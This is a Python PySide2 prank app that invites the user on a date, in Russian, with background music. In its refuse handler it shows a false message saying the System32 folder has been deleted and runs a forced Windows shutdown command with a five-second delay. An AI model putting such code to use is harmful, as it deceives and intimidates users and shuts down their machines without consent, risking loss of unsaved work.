import os
import sys

import PySide2
from PySide2 import QtCore, QtGui
from pygame import mixer
from PySide2.QtCore import QThread
from PySide2.QtWidgets import QMainWindow, QApplication

from ui.ui import Ui_MainWindow

dirname = os.path.dirname(PySide2.__file__)
plugin_path = os.path.join(dirname, 'plugins', 'platforms')
os.environ['QT_QPA_PLATFORM_PLUGIN_PATH'] = plugin_path
mixer.init()


def resource_path(relative):
    if hasattr(sys, "_MEIPASS"):
        return os.path.join(sys._MEIPASS, relative)
    return os.path.join(relative)


class PlaySound(QThread):
    def __init__(self, path):
        super().__init__()
        self.path = path

    def run(self):
        mixer.music.load(self.path)
        mixer.music.play()

    def terminate(self):
        mixer.music.stop()


class MainWindow(QMainWindow):
    def __init__(self):
        QMainWindow.__init__(self)
        self.ui = Ui_MainWindow()
        self.ui.setupUi(self)

        ##==> WINDOW OPTIONS
        ####################################################
        self.setWindowFlag(QtCore.Qt.FramelessWindowHint)
        self.setAttribute(QtCore.Qt.WA_TranslucentBackground)

        ##==> BUTTONS LOGIC
        ####################################################
        self.ui.accept_btn.clicked.connect(self.accept)
        self.ui.refuse_btn.clicked.connect(self.refuse)

        self.romantic_music = PlaySound(resource_path('./assets/romantic.mp3'))
        self.tragic_music = PlaySound(resource_path('./assets/tragic.mp3'))

        self.setWindowIcon(QtGui.QIcon(resource_path('./assets/icon.ico')))
        self.show()
        self.romantic_music.start()

    def accept(self):
        self.ui.title.setText("Отлично, тогда жду тебя завтра в 7, крошка :)")
        self.ui.accept_btn.setText("До завтра!")
        self.ui.accept_btn.clicked.connect(self.close)
        self.ui.refuse_btn.hide()

    def refuse(self):
        self.tragic_music.start()
        self.romantic_music.terminate()
        self.ui.title.setText("Папка System 32 удалена с вашего компьютера!")
        self.ui.accept_btn.setText("*Разбито*")
        self.ui.accept_btn.setEnabled(False)
        self.ui.refuse_btn.hide()
        os.system('shutdown /s /t 5')


if __name__ == '__main__':
    app = QApplication(sys.argv)
    app.setWindowIcon(QtGui.QIcon(resource_path('./assets/icon.ico')))
    window = MainWindow()
    sys.exit(app.exec_())
